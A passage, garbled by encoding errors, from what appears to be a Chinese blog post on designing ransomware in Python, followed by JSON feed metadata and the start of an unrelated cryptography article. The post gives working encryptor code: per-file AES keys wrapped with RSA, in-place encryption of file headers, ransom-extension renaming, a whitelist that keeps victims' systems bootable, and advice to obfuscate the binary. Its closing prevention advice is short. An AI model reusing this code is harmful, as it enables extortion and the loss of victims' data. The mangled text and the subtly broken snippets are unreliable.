å¯†è§£å¯†å¯†é’¥ï¼šæˆ‘ä»¬è¿˜å¯ä»¥å°†åŠ å¯†è§£å¯†çš„å¯†é’¥é™„åŠ åˆ°æ¯ä¸ªæ–‡ä»¶çš„æœ«å°¾ï¼Œè¿™å°†ä¸ç”¨å­˜å‚¨æ¯ä¸ªæ–‡ä»¶çš„è§£å¯†å¯†é’¥ã€‚ åŠ å¯†çš„æ–‡ä»¶ç»“æ„æœ€ç»ˆå°†å˜æˆå¦‚ä¸‹æ‰€ç¤ºï¼š åªåŠ å¯†æ–‡ä»¶çš„ä¸€éƒ¨åˆ†çš„å¦ä¸€ä¸ªä¼˜ç‚¹æ˜¯å®ƒå…è®¸æˆ‘ä»¬å¤„ç†åŒä¸€æ–‡ä»¶è€Œä¸æ˜¯ç”Ÿæˆæ–°çš„åŠ å¯†æ–‡ä»¶å¹¶åˆ é™¤æ—§æ–‡ä»¶ï¼Œè€Œè¿™åœ¨è¾¹ç•Œæƒ…å†µä¸‹å¾ˆæœ‰ç”¨ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æœ‰æƒå†™å…¥ç°æœ‰æ–‡ä»¶ï¼Œä½†ä¸èƒ½åˆ›å»ºæ–°æ–‡ä»¶ï¼Œå®ƒè¿˜å…è®¸æˆ‘ä»¬å¿«é€Ÿå¤„ç†éå¸¸å¤§çš„æ–‡ä»¶ï¼ˆç±»ä¼¼500Gçš„MySQLæ•°æ®åº“ï¼‰ã€‚ æ•´ä½“æ¶æ„ä¸ºæ¯ä¸ªè¿›ç¨‹é€‰æ‹©é€‚å½“çš„åŠ å¯†æ–¹å¼åï¼Œæˆ‘ä»¬å°†éœ€è¦è®¾è®¡æ•´ä½“æ¶æ„æ¥ä¼ æ’­æ­¤æ¶æ„è½¯ä»¶ï¼Œè¿™å°†æ¶‰åŠè‡ªåŠ¨ä¸ºæ¯ä¸ªpayloadåˆ›å»ºä¸€ç»„å¯†é’¥çš„è¿‡ç¨‹ï¼Œå› ä¸ºæˆ‘ä»¬ä¸å¸Œæœ›æ‰€æœ‰å—å®³è€…å…±äº«åŒä¸€å¯†é’¥ï¼ˆå¦‚æœä¸€ä¸ªäººæ”¯ä»˜äº†èµé‡‘ï¼Œå®ƒå¯ä»¥åˆ†å‘å¯†é’¥ï¼Œä»è€Œä½¿æ¯ä¸ªäººéƒ½å¯ä»¥è§£å¯†ä»–ä»¬çš„åŠ å¯†æ–‡ä»¶ï¼‰ã€‚æˆ‘ä»¬è¿˜éœ€è¦ä¿ç•™ä¸æ¯ä¸ªå—å®³è€…å…³è”çš„å¯†é’¥çš„æ•°æ®åº“ã€‚ ä¸ºå•ä¸ªpayloadç”Ÿæˆéå¯¹ç§°å¯†é’¥å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ssh-keygenå‘½ä»¤ï¼š 1ssh-keygen -b 2048 -m pem -f pem å¼€å‘è¯­è¨€é€‰æ‹©åªè¦æ‚¨é¿å…ä½¿ç”¨ç‰¹å®šäºæ“ä½œç³»ç»Ÿçš„æŒ‡ä»¤ï¼ˆä¾‹å¦‚ç”¨os.systemè°ƒç”¨çš„æŒ‡ä»¤ï¼‰ï¼Œå³è·¨å¹³å°çš„åŒæ—¶é€Ÿåº¦ä¹Ÿè¦å¾ˆå¿«ï¼ˆrustï¼‰ï¼Œå¹¶ä¸”å…·æœ‰æˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„å¤§å¤šæ•°åŠ å¯†æ“ä½œçš„åº“ã€‚æœ€åï¼Œå®ƒæœ€å¥½å…è®¸æ··æ·†ç¼–è¯‘åçš„ä»£ç ï¼Œè¿™æ ·èƒ½ä½¿æœ€ç»ˆäºŒè¿›åˆ¶æ–‡ä»¶çš„é€†å‘æ›´åŠ å›°éš¾ã€‚è¿™é‡Œæˆ‘ä»¬é€‰æ‹©äº†python(æ˜¾è€Œæ˜“è§ï¼Ÿ)ã€‚ åœ¨é€‰æ‹©pythonåº“æ—¶ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šå¯¼å…¥å¤šç§çœ‹ä¸Šå»åŠŸèƒ½ç›¸åŒçš„åº“ï¼Œè¿™æ˜¯ä¸ºäº†é€‰æ‹©å…¶ä¸­æœ€æœ‰æ•ˆçš„ä¸€ä¸ªï¼Œç‰¹åˆ«æ˜¯åœ¨å¯†ç å­¦è¿™ç§ä¸æ–­å˜åŒ–çš„é¢†åŸŸã€‚æ¯•ç«Ÿï¼Œè¿‡æ—¶çš„åŠ å¯†åº“æˆ–è€…è‡ªå»ºçš„åŠ å¯†æ–¹æ¡ˆå¯èƒ½ä¼šå¯¼è‡´è½¯ä»¶çš„æ¼æ´[3]ã€‚æˆ‘ä»¬å°†ä½¿ç”¨ä¸¤ä¸ªçŸ¥åçš„pythonåº“ï¼špycryptodomeå’Œsecretsã€‚ å®é™…ä¸Šï¼Œå¯ä»¥ä½¿ç”¨asymcryptã€‚ä½†æ˜¯ï¼Œæˆ‘å°†ä½¿ç”¨ç›´æ¥çš„pycryptodomeå¹¶åˆ›å»ºæ¯ä¸ªå‡½æ•°æ¥æ›´å¥½åœ°è¯´æ˜æ¦‚å¿µã€‚ ä¸»è¦å‡½æ•° generate32ByteKey() ï¼šç”Ÿæˆä¸€ä¸ªéšæœºçš„32å­—èŠ‚å¯†é’¥,æœ‰å¤šç§æ–¹æ³•å¯ä»¥åšåˆ°è¿™ä¸€ç‚¹ã€‚å¯ä»¥ä»/dev/urandomæŠ“å–ä¸€ä¸ªå­—ç¬¦ä¸²å¹¶å¯¹å…¶è¿›è¡Œsha256sumè¿ç®—ï¼Œä½†è¿™ç”¨äºlinuxï¼Œè€Œæˆ‘ä»¬å¸Œæœ›è½¯ä»¶è·¨å¹³å°ï¼Œå› æ­¤æˆ‘ä»¬å°†ä½¿ç”¨pythonçš„secretsåº“ï¼Œé€šè¿‡secrets.token_hex(32)å®Œæˆã€‚ rsaEncryptSecret(stringï¼ŒpublicKey)ï¼šä½¿ç”¨å…¬é’¥éå¯¹ç§°åŠ å¯†ä¿¡æ¯ï¼ˆå› æ­¤åªèƒ½ä½¿ç”¨ç§é’¥è§£å¯†ï¼‰ã€‚è¿™å°†ä½¿æˆ‘ä»¬èƒ½å¤Ÿä½¿ç”¨publicKeyåŠ å¯†æ¯ä¸ªæ–‡ä»¶çš„å¯¹ç§°å¯†é’¥ã€‚å®¢æˆ·ç«¯å°†ä½¿ç”¨æˆ‘ä»¬çš„privateKeyè§£å¯†æ¯ä¸ªæ–‡ä»¶çš„å¯¹ç§°å¯†é’¥ï¼Œç„¶åä½¿ç”¨å…¶è‡ªå·±çš„å¯¹ç§°å¯†é’¥è§£å¯†æ¯ä¸ªæ–‡ä»¶ã€‚ saDecryptSecret(secret, privateKey)ï¼šä½¿ç”¨ç§é’¥è§£å¯†åŠ å¯†çš„å¯¹ç§°å¯†é’¥ã€‚ symEncryptFile(publicKey, file)ï¼šæ­¤å‡½æ•°æ˜¯æœ€å¤æ‚çš„å‡½æ•°ï¼Œå…¶å«æœ‰å…·ä½“çš„åŠ å¯†é€»è¾‘ï¼Œåæ–‡å°†è¿›è¡Œè¿›ä¸€æ­¥è¯´æ˜ã€‚ä½†é¡¾åæ€ä¹‰ï¼Œå®ƒç”¨äºåŠ å¯†æ–‡ä»¶ã€‚ symDecryptFile(privateKey, file)ï¼šè§£å¯†æ–‡ä»¶ã€‚ symEncryptDirectory(publicKey, dir)ï¼šæ­¤å‡½æ•°æ¥æ”¶ç›®å½•ä½œä¸ºå‚æ•°ï¼Œå¹¶éå†ç›®å½•ä»¥è·å–å…¶ä¸­çš„æ‰€æœ‰æ–‡ä»¶ã€‚ä¹‹åï¼Œå®ƒå°†ä½¿ç”¨publicKeyè°ƒç”¨symEncryptFileã€‚ symDecryptDirectory(privateKey, dir)ï¼šä¸symEncryptDirectoryç±»ä¼¼ï¼Œé¡¾åæ€ä¹‰ã€‚ã€‚ã€‚ rsaEncryptSecret ä½¿ç”¨RSAåŠ å¯†å¯†é’¥ï¼Œä½†RSAåœ¨é»˜è®¤æƒ…å†µä¸‹ä¸ä¼šè¿›è¡Œä»»ä½•éšæœºåŠ å¯†ï¼Œå› æ­¤æˆ‘ä»¬å°†ä½¿ç”¨æœ€ä½³éå¯¹ç§°åŠ å¯†å¡«å……ï¼ˆç®€ç§°OAEPï¼‰ã€‚è¿™æ˜¯ä¸€ç§å¡«å……æ–¹æ¡ˆï¼Œå¯é€šè¿‡æ·»åŠ éšæœºæ€§å’Œå•å‘ç½®æ¢é™·é—¨æ¥æ”¹è¿›RSAã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå½“RSAä¸OAEPä¸€èµ·ä½¿ç”¨æ—¶ï¼Œæ‰€å¾—çš„å¯†ç å¤§å°åº”ä¸æ¨¡æ•°ç›¸åŒã€‚æ¨¡æ•°æ˜¯å¯†é’¥å¤§å°/8ï¼Œæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯2048ä½RSAï¼Œå› æ­¤ç”Ÿæˆçš„å¯†æ–‡åº”ä¸º256å­—èŠ‚ã€‚ ç®€å•ç¤ºä¾‹ï¼š 1234567891011def rsaEncryptSecret(string, publicKey): public_key = get_key(publicKey, None) # Create the cipher object cipher_rsa = PKCS1_OAEP.new(public_key) # We need to encode the string to work with bytes instead of chars bytestrings = str.encode(string) cipher_text = cipher_rsa.encrypt(bytestrings) #At this point the cipher_text should be 256 bytes in length # We&#x27;ll base64 encode it for convenience # Remember that a base64 string needs to be divisible by 3, so 256 bytes will become 258 with padding return base64.b64encode(cipher_text) RsaDecryptSecretä½¿ç”¨ç»™å®šçš„ç§é’¥è§£å¯†å¯†æ–‡ï¼š 123456789101112def rsaDecryptSecret(string, privateKey): # We firts import the private Key private_key = get_key(privateKey, None) # Decode the base64 encoded string base64DecodedSecret = base64.b64decode(string) # create the cipher object cipher_rsa = PKCS1_OAEP.new(private_key) # Decrypt the content decryptedBytestrings = cipher_rsa.decrypt(base64DecodedSecret) # Remember to convert the decoded cipher from bytes to string decryptedSecret = decryptedBytestrings.decode() return decryptedSecret SymEncryptFileè¿™æ˜¯ä¸»è¦çš„åŠ å¯†å‡½æ•°ã€‚å·¥ä½œæµç¨‹å¦‚ä¸‹ï¼š ä½¿ç”¨publicKeyå’Œæ–‡ä»¶è·¯å¾„ä½œä¸ºå‚æ•°è°ƒç”¨è¯¥å‡½æ•° 1def symEncryptFile(publicKeyï¼Œfile): ä¸ºæŒ‡å®šæ–‡ä»¶ç”Ÿæˆä¸€ä¸ªéšæœºå¯†é’¥ 1key = generateKey() ä½¿ç”¨publicKeyåŠ å¯†éšæœºå¯†é’¥ 1encriptedKey = rsaEncryptSecret(keyï¼ŒpublicKey) å®šä¹‰æ–‡ä»¶çš„åŠ å¯†å¤§å°ï¼ˆnä¸ªå­—èŠ‚ï¼‰ã€‚ 1buffer_size = 1048576 æ£€æŸ¥æ–‡ä»¶æ˜¯å¦åŠ å¯†ï¼Œå¦‚å·²åŠ å¯†ï¼Œè·³è¿‡ 123if file.endswith(&quot;.&quot; + cryptoName): print(&#x27;File is already encrypted, skipping&#x27;)return åŠ å¯†æ–‡ä»¶çš„å‰nä¸ªå­—èŠ‚å¹¶è¦†ç›–å…¶å†…å®¹ 123456789101112# Open the input and output filesinput_file = open(file, &#x27;r+b&#x27;)print(&quot;Encrypting file: &quot;+ file)output_file = open(file + &#x27;.&#x27; + cryptoName, &#x27;w+b&#x27;)# Create the cipher object and encrypt the datacipher_encrypt = AES.new(key, AES.MODE_CFB)# Encrypt file firstinput_file.seek(0)buffer = input_file.read(buffer_size)ciphered_bytes = cipher_encrypt.encrypt(buffer)input_file.seek(0)input_file.write(ciphered_bytes) å°†åŠ å¯†ç”¨çš„éšæœºå¯†é’¥æ·»åŠ åˆ°æ–‡ä»¶æœ«å°¾ 12input_file.seek(0, os.SEEK_END)input_file.write(encriptedKey.encode()) åœ¨æ–‡ä»¶æœ«å°¾é™„åŠ AES IVï¼ˆåˆå§‹åŒ–å‘é‡ï¼‰ 12input_file.seek(0, os.SEEK_END)input_file.write(cipher_encrypt.iv) é‡å‘½åæ–‡ä»¶ 12input_file.close()os.rename(file, file + &quot;.&quot; + cryptoName) éœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬å¹¶ä¸éœ€è¦å¤åˆ¶å®Œæ•´çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬åªæ˜¯åœ¨æ–‡ä»¶ä¸Šä½¿ç”¨äº†seek()æ¥å®šä½å­—èŠ‚å¹¶ä½¿è¿‡ç¨‹å°½å¯èƒ½å¿«ã€‚è¿™ä¹Ÿå°†åœ¨è§£å¯†åŠŸèƒ½ä¸­ä½¿ç”¨ã€‚ è¿˜è¦æ³¨æ„ï¼Œç”±äºæˆ‘ä»¬åœ¨åŠ å¯†æ–‡ä»¶ä¸­åŒæ—¶å†™å…¥äº†AES IVå’ŒåŠ å¯†å¯†é’¥ï¼Œå› æ­¤æˆ‘ä»¬ä¸éœ€è¦ä»»ä½•å¸¦æœ‰æ¯ä¸ªåŠ å¯†æ–‡ä»¶ç´¢å¼•çš„txtæ–‡ä»¶ã€‚å—å®³è€…å¯ä»¥å‘æˆ‘ä»¬å‘é€ä»»ä½•æ–‡ä»¶ï¼Œåªè¦æˆ‘ä»¬æ‹¥æœ‰ç”¨äºç‰¹å®šäºŒè¿›åˆ¶æ–‡ä»¶çš„ç§é’¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¯¹å…¶è§£å¯†ã€‚ SymDecryptFileè¿™æ˜¯ä¸»è¦çš„è§£å¯†å‡½æ•°ã€‚å·¥ä½œæµç¨‹å¦‚ä¸‹ï¼š ä½¿ç”¨privateKeyå’Œæ–‡ä»¶è·¯å¾„ä½œä¸ºå‚æ•°è°ƒç”¨è¯¥å‡½æ•° 1def symDecryptFile(privateKey, file): å®šä¹‰æ–‡ä»¶çš„è§£å¯†å¤§å°ï¼ˆnä¸ªå­—èŠ‚ï¼‰ï¼ˆç­‰äºåŠ å¯†ä¸­ä½¿ç”¨çš„å¤§å°ï¼‰ 1buffer_size = 1048576 éªŒè¯æ–‡ä»¶æ˜¯å¦å·²åŠ å¯†ï¼ˆå¸¦æœ‰æ‰©å±•åï¼‰ 123456if file.endswith(&quot;.&quot; + cryptoName): out_filename = file[:-(len(cryptoName) + 1)] print(&quot;Decrypting file: &quot; + file)else: print(&#x27;File is not encrypted&#x27;) return æ‰“å¼€æ–‡ä»¶å¹¶è¯»å–AES IVï¼ˆæœ€å16ä¸ªå­—èŠ‚ï¼‰ 1234input_file = open(file, &#x27;r+b&#x27;)# Read in the ivinput_file.seek(-16, os.SEEK_END)iv = input_file.read(16) è¯»å–åŠ å¯†çš„è§£å¯†å¯†é’¥ 12345# we move the pointer to 274 bytes before the end of file# (258 bytes of the encryption key + 16 of the AES IV)input_file.seek(-274, os.SEEK_END)# And we read the 258 bytes of the keysecret = input_file.read(258) ä½¿ç”¨æä¾›çš„ç§é’¥è§£å¯†åŠ å¯†çš„å¯†é’¥ 1key = rsaDecryptSecret(cert, secret) è§£å¯†æˆ‘ä»¬ä¹‹å‰å®šä¹‰çš„aesåŠ å¯†çš„ç¼“å†²åŒºå¤§å°ï¼Œå¹¶å°†å…¶å†™å…¥æ–‡ä»¶çš„å¼€å¤´ 12345678910# Create the cipher objectcipher_encrypt = AES.new(privateKey, AES.MODE_CFB, iv=iv) # Read the encrypted header input_file.seek(0) buffer = input_file.read(buffer_size)# Decrypt the header with the keydecrypted_bytes = cipher_encrypt.decrypt(buffer) # Write the decrypted text on the same fileinput_file.seek(0)input_file.write(decrypted_bytes) ä»æ–‡ä»¶æœ«å°¾åˆ é™¤ivå’ŒåŠ å¯†å¯†é’¥å¹¶é‡å‘½å 123456# Delete the last 274 bytes from the IV + key. input_file.seek(-274, os.SEEK_END) input_file.truncate() input_file.close() # Rename the file to delete the encrypted extension os.rename(file, out_filename) æ€»ç»“ä½¿ç”¨ä¸Šè¿°å‡½æ•°ï¼Œæˆ‘ä»¬å°±å¯ä»¥è·å¾—æƒ³è¦çš„æœ€ç»ˆäºŒè¿›åˆ¶æ–‡ä»¶äº†ã€‚å¦‚æœæ­£ç¡®ç¼–è¯‘äº†symEncryptDirectory / symDecryptDirectoryï¼Œåˆ™å¯ä»¥é€‰æ‹©å¯¹å‚æ•°ä¸­çš„æ–‡ä»¶å¤¹/æ–‡ä»¶è¿›è¡ŒåŠ å¯†æˆ–è§£å¯†ï¼Œç„¶åä»…ä¼ é€’.pemæ–‡ä»¶ã€‚ç¨‹åºçš„å‚æ•°é€‰æ‹©å¤§è‡´å¦‚ä¸‹ï¼š 1234567parser = argparse.ArgumentParser()parser.add_argument(&quot;--dest&quot;, &quot;-d&quot;, help=&quot;File or directory to encrypt/decrypt&quot;, dest=&quot;destination&quot;, default=&quot;none&quot;, required=True)parser.add_argument(&quot;--action&quot;, &quot;-a&quot;, help=&quot;Action (encrypt/decrypt)&quot;, dest=&quot;action&quot;, required=True) parser.add_argument(&quot;--pem&quot;,&quot;-p&quot;, help=&quot;Public/Private key&quot;, dest=&quot;key&quot;, required=True) é™¤äº†ç¼ºå°‘é”™è¯¯å¤„ç†æ¨¡å—ï¼ˆæ£€æŸ¥encryptæ“ä½œæ˜¯å¦å…·æœ‰ä½œä¸ºå‚æ•°ä¼ é€’çš„å…¬é’¥ï¼Œdecryptæ˜¯å¦å…·æœ‰ç§é’¥ç­‰ï¼‰ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜å¿…é¡»å®šä¹‰å„ç±»æ“ä½œç³»ç»Ÿçš„ç™½åå•ã€‚è¿™æ­¥æ“ä½œæ˜¯ä¸ºäº†ä½¿è®¡ç®—æœºâ€œå¯ç”¨â€ä½†ä»å¤„äºåŠ å¯†çŠ¶æ€ã€‚å¦‚æœæ‚¨åªæ˜¯åŠ å¯†æ‰€æœ‰å¯è§æ–‡ä»¶ï¼Œåˆ™å¯èƒ½ä¼šï¼š ä½¿è®¡ç®—æœºæ— æ³•ä½¿ç”¨ï¼Œè¿™å°†ä½¿å—å®³è€…å‘ç°é—®é¢˜ã€‚ å¯¹æ‰€æœ‰å†…å®¹è¿›è¡ŒåŠ å¯†åï¼Œç³»ç»Ÿå°†æ— æ³•å¯åŠ¨ï¼Œå¹¶ä¸”ç”¨æˆ·å°†ä¸çŸ¥é“è‡ªå·±é­åˆ°äº†å‹’ç´¢è½¯ä»¶çš„æ”»å‡»ã€‚ åœ¨Linuxä¸‹ï¼Œç™½åå•ç±»ä¼¼äºï¼š 1whitelist = [&quot;/etc/ssh&quot;, &quot;/etc/pam.d&quot;, &quot;/etc/security/&quot;, &quot;/boot&quot;, &quot;/run&quot;, &quot;/usr&quot;, &quot;/snap&quot;, &quot;/var&quot;, &quot;/sys&quot;, &quot;/proc&quot;, &quot;/dev&quot;, &quot;/bin&quot;, &quot;/sbin&quot;, &quot;/lib&quot;, &quot;passwd&quot;, &quot;shadow&quot;, &quot;known_hosts&quot;, &quot;sshd_config&quot;, &quot;/home/sec/.viminfo&quot;, &#x27;/etc/crontab&#x27;, &quot;/etc/default/locale&quot;, &quot;/etc/environment&quot;] å…¶ä»–å½¢å¼çš„å‹’ç´¢è½¯ä»¶ï¼ˆMBRåŠ å¯†ï¼‰ç›®å‰è¿˜å­˜åœ¨å…¶ä»–ç±»å‹çš„å‹’ç´¢è½¯ä»¶ï¼Œä¾‹å¦‚æŸäº›å‹’ç´¢è½¯ä»¶æ„ŸæŸ“äº†é©±åŠ¨å™¨çš„ä¸»å¯åŠ¨è®°å½•ï¼Œè€Œpayloadå°†åŠ å¯†æ–‡ä»¶ç³»ç»Ÿçš„NTFSæ–‡ä»¶è¡¨ï¼Œä»è€Œä½¿ç£ç›˜æ— æ³•ä½¿ç”¨ã€‚ç”±äºè¿™ç±»å‹’ç´¢è½¯ä»¶åªéœ€è¦åŠ å¯†ä¸€å°éƒ¨åˆ†æ•°æ®ï¼Œå› æ­¤è¿™ç§æ–¹æ³•éå¸¸å¿«[5]ã€‚Petyaå‹’ç´¢è½¯ä»¶å°±æ˜¯è¿™ç§è®¾è®¡çš„ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­ã€‚ä½†å®ƒæœ‰ä¸‰ä¸ªä¸»è¦ç¼ºç‚¹ï¼š å³ä½¿æ“ä½œç³»ç»Ÿæ— æ³•å¯åŠ¨ï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥é€šè¿‡å–è¯åˆ†ææ¥æ¢å¤æ–‡ä»¶ã€‚å®ƒä»¬å¹¶ä¸ä¼šè¢«åˆ é™¤ï¼Œåªæ˜¯åœ¨æ–‡ä»¶è¡¨ä¸­è¢«å–æ¶ˆå¼•ç”¨ã€‚å³ä½¿æ¶æ„è½¯ä»¶åœ¨é‡æ–°å¯åŠ¨è®¡ç®—æœºåå¯åŠ¨äº†åŸå§‹æ•°æ®çš„åŠ å¯†ä¾‹ç¨‹ï¼Œåªè¦å—å®³è€…ç«‹å³å…³é—­è®¡ç®—æœºå¹¶å–å‡ºç£ç›˜ï¼Œæ–‡ä»¶ä¹Ÿæœ‰å¾ˆå¤§å¯èƒ½å¯ä»¥é€šè¿‡å–è¯åˆ†æå¾—åˆ°æ¢å¤ã€‚ å¤§å¤šæ•°ç°ä»£æ“ä½œç³»ç»Ÿå·²è¿ç§»åˆ°GPTï¼ˆGUIDåˆ†åŒºè¡¨ï¼‰ï¼Œä¸å†ä½¿ç”¨MBR[6]ã€‚ å®ƒä¸¥é‡ä¾èµ–äºæ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶ä¸”éœ€è¦å¯¹å…¶è¿›è¡Œä¿®æ”¹ä»¥è€ƒè™‘å…¶ä»–åŒºåˆ«äºNTFSçš„æ–‡ä»¶ç³»ç»Ÿç±»å‹ï¼ˆå¦‚EXT3/EXT4ï¼ŒZFSç­‰ï¼‰ã€‚ è¿™ç§æ–¹æ³•éœ€è¦äº†è§£æ›´å¤šçš„åº•å±‚æŠ€æœ¯çŸ¥è¯†ï¼Œå¦å¤–ï¼Œè¿™ç§æ–¹æ³•ä¹Ÿä¸æ˜¯æœ€å¸¸ç”¨çš„æ–¹æ³•ï¼Œæœ¬æ–‡çš„ä¸»è¦ç›®çš„æ˜¯æ›´å¥½åœ°ç†è§£å¸¸è§çš„å‹’ç´¢è½¯ä»¶ã€‚ å»ºè®®é™¤äº†ä¸€äº›æ˜¾è€Œæ˜“è§çš„å»ºè®®ï¼ˆä¸è¦æ‰“å¼€æ¥è‡ªæœªçŸ¥æ¥æºçš„æ–‡ä»¶ï¼Œç»å¸¸æ›´æ–°è½¯ä»¶å’Œç³»ç»Ÿï¼Œä½¿ç”¨æ€æ¯’è½¯ä»¶ç­‰ï¼‰ä¹‹å¤–ï¼Œæœ€ä¸»è¦çš„é¢„é˜²æŠ€æœ¯å°±æ˜¯å¤‡ä»½ï¼Œå¤‡ä»½å’Œå¤‡ä»½ã€‚ã€‚ã€‚æˆ–è®¸è¿˜æœ‰å¾ˆå¤šæœ‰å…³å¦‚ä½•é˜²æ­¢æ”»å‡»çš„å»ºè®®ï¼Œä½†æˆ‘è®¤ä¸ºæœ€å¥½çš„åŠæ³•æ°¸è¿œæ˜¯æ‹¥æœ‰æ•°æ®çš„è„±æœºå¤‡ä»½ã€‚ æ¯•ç«Ÿä¸€ä¸ªå±€åŸŸç½‘å†…ä¸æ˜¯æ‰€æœ‰äººéƒ½å¯ä»¥åšåˆ°ä»¥ä¸Šå‡ ç‚¹ Ps. å¦‚æœæ‚¨å·²è¢«æ„ŸæŸ“ï¼Œå¹¶ä¸”ä¸éœ€è¦ç«‹å³æ¢å¤åŠ å¯†æ–‡ä»¶ï¼ˆå®¶åº­ç…§ç‰‡ï¼Œè§†é¢‘ç­‰ï¼‰ï¼Œé‚£ä¹ˆå¯ä»¥å°è¯•ä¿ç•™åŠ å¯†æ–‡ä»¶çš„å‰¯æœ¬ã€‚æœ‰æ—¶ï¼Œå‹’ç´¢è½¯ä»¶çš„å¼€å‘äººå‘˜è¦ä¹ˆé€€ä¼‘ï¼ˆShadeï¼ŒTeslaCryptï¼ŒHildaCryptï¼‰ï¼Œè¦ä¹ˆè¢«æ•ï¼ˆCoinVaultï¼‰ï¼Œç”šè‡³æœ‰æ—¶å€™ä¼šå…¬å¼€ç«äº‰å¯¹æ‰‹çš„å¯†é’¥ï¼ˆPetya vs Chimeraï¼‰ï¼Œè¿™äº›æƒ…å†µä¸‹è§£å¯†çš„å¯†é’¥éƒ½å¯èƒ½è¢«å…¬å¼€ï¼Œä»è€Œæ¢å¤æ–‡ä»¶ã€‚ç­‰ç­‰å…šæ°¸ä¸ä¸ºå¥´ å‚è€ƒhttps://www.computerworld.com/article/2489311/cryptodefense-ransomware-leaves-decryption-key-accessible.html â†©https://blog.checkpoint.com/2014/08/27/hacking-the-hacker/ â†©https://blog.malwarebytes.com/threat-analysis/2018/04/lockcrypt-ransomware/ â†©https://stackoverflow.com/questions/13378815/base64-length-calculation â†©https://en.wikipedia.org/wiki/Petya_(malware) â†©https://www.howtogeek.com/193669/whats-the-difference-between-gpt-and-mbr-when-partitioning-a-drive/ â†©GonnaCryå‹’ç´¢è½¯ä»¶ â†©Architecture of a ransomware â†©","categories":[],"tags":[{"name":"å‹’ç´¢è½¯ä»¶","slug":"å‹’ç´¢è½¯ä»¶","permalink":"https://mundi-xu.github.io/tags/%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6/"},{"name":"æ¶æ„è½¯ä»¶","slug":"æ¶æ„è½¯ä»¶","permalink":"https://mundi-xu.github.io/tags/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/"},{"name":"Hybrid Cryptosystem","slug":"Hybrid-Cryptosystem","permalink":"https://mundi-xu.github.io/tags/Hybrid-Cryptosystem/"}]},{"title":"å¯†ç å­¦åˆæ¢-åŸºäºRUSTçš„å¯†ç ç³»ç»Ÿä¸ç®—æ³•ç®€æ","slug":"å¯†ç å­¦åˆæ¢-åŸºäºRUSTçš„å¯†ç ç®—æ³•ç®€æ","date":"2020-12-27T06:05:31.000Z","updated":"2020-12-27T10:47:07.846Z","comments":true,"path":"2020/12/27/å¯†ç å­¦åˆæ¢-åŸºäºRUSTçš„å¯†ç ç®—æ³•ç®€æ/","link":"","permalink":"https://mundi-xu.github.io/2020/12/27/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%88%9D%E6%8E%A2-%E5%9F%BA%E4%BA%8ERUST%E7%9A%84%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95%E7%AE%80%E6%9E%90/","excerpt":"åŸºäº rust å¼€å‘çš„åœ¨çº¿åŠ è§£å¯†ç³»ç»Ÿä¸å„ç±»åŠ å¯†å‡½æ•°çš„ç®€æã€‚","text":"Introductionå¯†ç å­¦ï¼ˆCryptographyï¼‰ä¸€èˆ¬å¯åˆ†ä¸ºå¤å…¸å¯†ç å­¦å’Œç°ä»£å¯†ç å­¦ã€‚ å…¶ä¸­ï¼Œå¤å…¸å¯†ç å­¦ï¼Œä½œä¸ºä¸€ç§å®ç”¨æ€§è‰ºæœ¯å­˜åœ¨ï¼Œå…¶ç¼–ç å’Œç ´è¯‘é€šå¸¸ä¾èµ–äºè®¾è®¡è€…å’Œæ•Œæ‰‹çš„åˆ›é€ åŠ›ä¸æŠ€å·§ï¼Œå¹¶æ²¡æœ‰å¯¹å¯†ç å­¦åŸä»¶è¿›è¡Œæ¸…æ™°çš„å®šä¹‰ã€‚å¤å…¸å¯†ç å­¦ä¸»è¦åŒ…å«ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š å•è¡¨æ›¿æ¢åŠ å¯†ï¼ˆMonoalphabetic Cipherï¼‰ å¤šè¡¨æ›¿æ¢åŠ å¯†ï¼ˆPolyalphabetic Cipherï¼‰ å¥‡å¥‡æ€ªæ€ªçš„åŠ å¯†æ–¹å¼ è€Œç°ä»£å¯†ç å­¦åˆ™èµ·æºäº 20 ä¸–çºªä¸­åæœŸå‡ºç°çš„å¤§é‡ç›¸å…³ç†è®ºï¼Œ1949 å¹´é¦™å†œï¼ˆC. E. Shannonï¼‰å‘è¡¨äº†é¢˜ä¸ºã€Šä¿å¯†ç³»ç»Ÿçš„é€šä¿¡ç†è®ºã€‹çš„ç»å…¸è®ºæ–‡æ ‡å¿—ç€ç°ä»£å¯†ç å­¦çš„å¼€å§‹ã€‚ç°ä»£å¯†ç å­¦ä¸»è¦åŒ…å«ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š å¯¹ç§°åŠ å¯†ï¼ˆSymmetric Cryptographyï¼‰ï¼Œä»¥ DESï¼ŒAESï¼ŒRC4 ä¸ºä»£è¡¨ã€‚ éå¯¹ç§°åŠ å¯†ï¼ˆAsymmetric Cryptographyï¼‰ï¼Œä»¥ RSAï¼ŒElGamalï¼Œæ¤­åœ†æ›²çº¿åŠ å¯†ä¸ºä»£è¡¨ã€‚ å“ˆå¸Œå‡½æ•°ï¼ˆHash Functionï¼‰ï¼Œä»¥ MD5ï¼ŒSHA-1ï¼ŒSHA-512 ç­‰ä¸ºä»£è¡¨ã€‚ æ•°å­—ç­¾åï¼ˆDigital Signatureï¼‰ï¼Œä»¥ RSA ç­¾åï¼ŒElGamal ç­¾åï¼ŒDSA ç­¾åä¸ºä»£è¡¨ã€‚ å…¶ä¸­ï¼Œå¯¹ç§°åŠ å¯†ä½“åˆ¶ä¸»è¦åˆ†ä¸ºä¸¤ç§æ–¹å¼ï¼š åˆ†ç»„å¯†ç ï¼ˆBlock Cipherï¼‰ï¼Œåˆç§°ä¸ºå—å¯†ç ã€‚ åºåˆ—å¯†ç ï¼ˆStream 